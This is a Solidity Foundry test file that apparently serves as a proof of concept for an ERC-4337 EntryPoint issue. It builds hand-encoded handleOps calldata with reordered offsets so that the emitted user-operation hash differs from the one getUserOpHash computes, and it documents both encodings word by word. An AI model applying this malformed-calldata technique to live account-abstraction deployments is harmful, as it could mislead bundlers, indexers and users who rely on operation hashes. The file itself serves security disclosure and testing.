// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {EntryPoint} from "@eth-infinitism/account-abstraction/core/EntryPoint.sol";
import {UserOperation, UserOperationLib} from "@eth-infinitism/account-abstraction/interfaces/UserOperation.sol";
import {ExampleAccountFactory} from "../src/ExampleAccountFactory.sol";
import {ExampleAccount} from "../src/ExampleAccount.sol";
import {ERC1967Proxy} from "@openzeppelin/proxy/ERC1967/ERC1967Proxy.sol";
import {ECDSA} from "@openzeppelin/utils/cryptography/ECDSA.sol";


contract UserOpHashPOC is Test {

    using ECDSA for bytes32;

    EntryPoint entryPoint;
    ExampleAccountFactory factory;

    // Declare event for `vm.expectEmit`
    event UserOperationEvent(bytes32 indexed userOpHash, address indexed sender, address indexed paymaster, uint256 nonce, bool success, uint256 actualGasCost, uint256 actualGasUsed);

    function setUp() public {
        entryPoint = new EntryPoint();

        factory = new ExampleAccountFactory(entryPoint);
    }

    function test_divergeHashesFromEntryPoint() public {
        (address user, uint256 userPrivateKey) = makeAddrAndKey("User");
        uint256 salt = 0;

        address account = factory.getAddress(user, salt);
        vm.deal(account, 1 ether);

        UserOperation memory uo;

        uo.sender = account;
        uo.nonce = 0;
        uo.initCode = abi.encodePacked(
            address(factory), abi.encodeWithSelector(ExampleAccountFactory.createAccount.selector, user, salt)
        );
        uo.callData = abi.encodeWithSelector(ExampleAccount.nonce.selector); // Get the newly deployed wallet account's nonce
        uo.callGasLimit = 5000000;
        uo.verificationGasLimit = 500000;
        uo.preVerificationGas = 10;
        uo.maxFeePerGas = 10 gwei;
        uo.maxPriorityFeePerGas = 1 gwei;
        uo.paymasterAndData = "";

        // Sign user op
        bytes32 hashToSign = keccak256(
            abi.encode(
                uo.sender,
                uo.nonce,
                uo.initCode,
                uo.callData,
                uo.callGasLimit,
                uo.verificationGasLimit,
                uo.preVerificationGas,
                uo.maxFeePerGas,
                uo.maxPriorityFeePerGas,
                uo.paymasterAndData,
                address(entryPoint),
                block.chainid
            )
        ).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hashToSign);
        uo.signature = abi.encodePacked(r, s, v);

        bytes memory callData = abi.encodePacked(
            entryPoint.handleOps.selector,
            uint256(0x40), // Offset of ops
            uint256(uint160(account)), // beneficiary
            uint256(1), // Len of ops
            uint256(0x20), // offset of ops[0]
            uint256(uint160(uo.sender)),
            uo.nonce,
            uint256(0x240), // offset of uo.initCode (encoding assumes a 65-byte long signature, which it is using the provided address.)
            uint256(0x180), // offset of uo.callData
            uo.callGasLimit,
            uo.verificationGasLimit,
            uo.preVerificationGas,
            uo.maxFeePerGas,
            uo.maxPriorityFeePerGas,
            uint256(0x160), // offset of uo.paymasterAndData
            uint256(0x1c0), // offset of uo.signature
            uint256(uo.paymasterAndData.length),
            rightPadBytes(uo.paymasterAndData),
            uint256(uo.callData.length),
            rightPadBytes(uo.callData),
            uint256(uo.signature.length),
            rightPadBytes(uo.signature),
            uint256(uo.initCode.length),
            rightPadBytes(uo.initCode)
        );

        // This results in the following callData:
        //                                          1fad948c                                                         // function selector
        // args@0x000:                              0000000000000000000000000000000000000000000000000000000000000040 // offset of ops
        // args@0x020:                              000000000000000000000000308c46ef8d5dc1d454dac89f2bc7310a09a0c5db // beneficiary
        // args@0x040: args[0]@0x000:               0000000000000000000000000000000000000000000000000000000000000001 // length of ops
        // args@0x060: args[0]@0x020:               0000000000000000000000000000000000000000000000000000000000000020 // offset of ops[0]
        // args@0x080: args[0]@0x040: ops[0]@0x000: 000000000000000000000000308c46ef8d5dc1d454dac89f2bc7310a09a0c5db // uo.sender
        // args@0x0a0: args[0]@0x060: ops[0]@0x020: 0000000000000000000000000000000000000000000000000000000000000000 // uo.nonce
        // args@0x0c0: args[0]@0x080: ops[0]@0x040: 0000000000000000000000000000000000000000000000000000000000000240 // offset of uo.initCode within ops[0]
        // args@0x0e0: args[0]@0x0a0: ops[0]@0x060: 0000000000000000000000000000000000000000000000000000000000000180 // offset of uo.callData within ops[0]
        // args@0x100: args[0]@0x0c0: ops[0]@0x080: 00000000000000000000000000000000000000000000000000000000004c4b40 // uo.callGasLimit
        // args@0x120: args[0]@0x0e0: ops[0]@0x0a0: 000000000000000000000000000000000000000000000000000000000007a120 // uo.verificationGasLimit
        // args@0x140: args[0]@0x100: ops[0]@0x0c0: 000000000000000000000000000000000000000000000000000000000000000a // uo.preVerificationGas
        // args@0x160: args[0]@0x120: ops[0]@0x0e0: 00000000000000000000000000000000000000000000000000000002540be400 // uo.maxFeePerGas
        // args@0x180: args[0]@0x140: ops[0]@0x100: 000000000000000000000000000000000000000000000000000000003b9aca00 // uo.maxPriorityFeePerGas
        // args@0x1a0: args[0]@0x160: ops[0]@0x120: 0000000000000000000000000000000000000000000000000000000000000160 // offset of uo.paymasterAndData within ops[0]
        // args@0x1c0: args[0]@0x180: ops[0]@0x140: 00000000000000000000000000000000000000000000000000000000000001c0 // offset of uo.signature within ops[0]
        // args@0x1e0: args[0]@0x1a0: ops[0]@0x160: 0000000000000000000000000000000000000000000000000000000000000000 // Length of paymasterAndData
        // args@0x200: args[0]@0x1c0: ops[0]@0x180: 0000000000000000000000000000000000000000000000000000000000000004 // length of callData
        // args@0x220: args[0]@0x1e0: ops[0]@0x1a0: affed0e000000000000000000000000000000000000000000000000000000000 // callData
        // args@0x240: args[0]@0x200: ops[0]@0x1c0: 0000000000000000000000000000000000000000000000000000000000000041 // length of signature
        // args@0x260: args[0]@0x220: ops[0]@0x1e0: d7b041797cb5bc69a7f5d2217dbc7a0907767d2dff473eb21c059ea07a35f644 // signature
        // args@0x280: args[0]@0x240: ops[0]@0x200: 394e2369ccf701ccd1c56d9f8dcfe5bf85608f88c19d30ebd864b78fa7b32da1 // signature
        // args@0x2a0: args[0]@0x260: ops[0]@0x220: 1b00000000000000000000000000000000000000000000000000000000000000 // signature
        // args@0x2c0: args[0]@0x280: ops[0]@0x240: 0000000000000000000000000000000000000000000000000000000000000058 // length of initCode
        // args@0x2e0: args[0]@0x2a0: ops[0]@0x260: 2e234dae75c793f67a35089c9d99245e1c58470b5fbfb9cf0000000000000000 // initCode
        // args@0x300: args[0]@0x2c0: ops[0]@0x280: 000000005cb738dae833ec21fe65ae1719fad8ab8ce7f23d0000000000000000 // initCode
        // args@0x320: args[0]@0x2e0: ops[0]@0x2a0: 0000000000000000000000000000000000000000000000000000000000000000 // initCode

        // Standard calldata (non-exploit, computed using abi.encodeWithSelector(entryPoint.handleOps.selector, ops, account))

        //                                          1fad948c                                                         // function selector
        // args@0x000:                              0000000000000000000000000000000000000000000000000000000000000040 // offset of ops
        // args@0x020:                              000000000000000000000000308c46ef8d5dc1d454dac89f2bc7310a09a0c5db // beneficiary
        // args@0x040: args[0]@0x000:               0000000000000000000000000000000000000000000000000000000000000001 // length of ops
        // args@0x060: args[0]@0x020:               0000000000000000000000000000000000000000000000000000000000000020 // offset of ops[0]
        // args@0x080: args[0]@0x040: ops[0]@0x000: 000000000000000000000000308c46ef8d5dc1d454dac89f2bc7310a09a0c5db // uo.sender
        // args@0x0a0: args[0]@0x060: ops[0]@0x020: 0000000000000000000000000000000000000000000000000000000000000000 // uo.nonce
        // args@0x0c0: args[0]@0x080: ops[0]@0x040: 0000000000000000000000000000000000000000000000000000000000000160 // offset of uo.initCode within ops[0]
        // args@0x0e0: args[0]@0x0a0: ops[0]@0x060: 00000000000000000000000000000000000000000000000000000000000001e0 // offset of uo.callData within ops[0]
        // args@0x100: args[0]@0x0c0: ops[0]@0x080: 00000000000000000000000000000000000000000000000000000000004c4b40 // uo.callGasLimit
        // args@0x120: args[0]@0x0e0: ops[0]@0x0a0: 000000000000000000000000000000000000000000000000000000000007a120 // uo.verificationGasLimit
        // args@0x140: args[0]@0x100: ops[0]@0x0c0: 000000000000000000000000000000000000000000000000000000000000000a // uo.preVerificationGas
        // args@0x160: args[0]@0x120: ops[0]@0x0e0: 00000000000000000000000000000000000000000000000000000002540be400 // uo.maxFeePerGas
        // args@0x180: args[0]@0x140: ops[0]@0x100: 000000000000000000000000000000000000000000000000000000003b9aca00 // uo.maxPriorityFeePerGas
        // args@0x1a0: args[0]@0x160: ops[0]@0x120: 0000000000000000000000000000000000000000000000000000000000000220 // offset of uo.paymasterAndData within ops[0]
        // args@0x1c0: args[0]@0x180: ops[0]@0x140: 0000000000000000000000000000000000000000000000000000000000000240 // offset of uo.signature within ops[0]
        // args@0x1e0: args[0]@0x1a0: ops[0]@0x160: 0000000000000000000000000000000000000000000000000000000000000058 // length of initCode
        // args@0x200: args[0]@0x1c0: ops[0]@0x180: 2e234dae75c793f67a35089c9d99245e1c58470b5fbfb9cf0000000000000000 // initCode
        // args@0x220: args[0]@0x1e0: ops[0]@0x1a0: 000000005cb738dae833ec21fe65ae1719fad8ab8ce7f23d0000000000000000 // initCode
        // args@0x240: args[0]@0x200: ops[0]@0x1c0: 0000000000000000000000000000000000000000000000000000000000000000 // initCode
        // args@0x260: args[0]@0x220: ops[0]@0x1e0: 0000000000000000000000000000000000000000000000000000000000000004 // length of callData
        // args@0x280: args[0]@0x240: ops[0]@0x200: affed0e000000000000000000000000000000000000000000000000000000000 // callData
        // args@0x2a0: args[0]@0x260: ops[0]@0x220: 0000000000000000000000000000000000000000000000000000000000000000 // length of paymasterAndData
        // args@0x2c0: args[0]@0x280: ops[0]@0x240: 0000000000000000000000000000000000000000000000000000000000000041 // length of signature
        // args@0x2e0: args[0]@0x2a0: ops[0]@0x260: d7b041797cb5bc69a7f5d2217dbc7a0907767d2dff473eb21c059ea07a35f644 // signature
        // args@0x300: args[0]@0x2c0: ops[0]@0x280: 394e2369ccf701ccd1c56d9f8dcfe5bf85608f88c19d30ebd864b78fa7b32da1 // signature
        // args@0x320: args[0]@0x2e0: ops[0]@0x2a0: 1b00000000000000000000000000000000000000000000000000000000000000 // signature

        bytes32 expectedUserOpHash = entryPoint.getUserOpHash(uo);
        assertEq(expectedUserOpHash, 0xf8d19bb1ac52479d3bc953d8768a2eef2ce0051d55d5bafb34bcee8ed9c4da09);
        bytes32 actualUserOpHash = 0xfd3ec4e5d5568b2b0ba2d87f1445217558d870c0dfa9a48b27f9c31dcda5ae16;

        vm.expectEmit(true, true, true, true, address(entryPoint));
        emit UserOperationEvent(/*userOpHash*/ actualUserOpHash, /*sender*/ 0x308c46eF8d5DC1D454dAc89f2Bc7310a09a0C5Db, /*paymaster*/ address(0), /*nonce*/ 0, /*success*/ true, /*actualGasCost*/ 211206000000000, /*actualGasUsed*/ 211206);
        
        // Call handleOps in EntryPoint
        (bool success,) = address(entryPoint).call(callData);
        (success);
    }

    /**
     * Align a sequence of bytes to a full word length by padding with zeroes.
     */
    function rightPadBytes(bytes memory input) internal pure returns (bytes memory) {
        bytes memory zeroPadding = "";

        uint256 zeros = 32 - (input.length % 32);

        if (zeros != 32) {
            for (uint256 i = 0; i < zeros; ++i) {
                zeroPadding = bytes.concat(zeroPadding, hex"00");
            }
        }

        return bytes.concat(input, zeroPadding);
    }
}
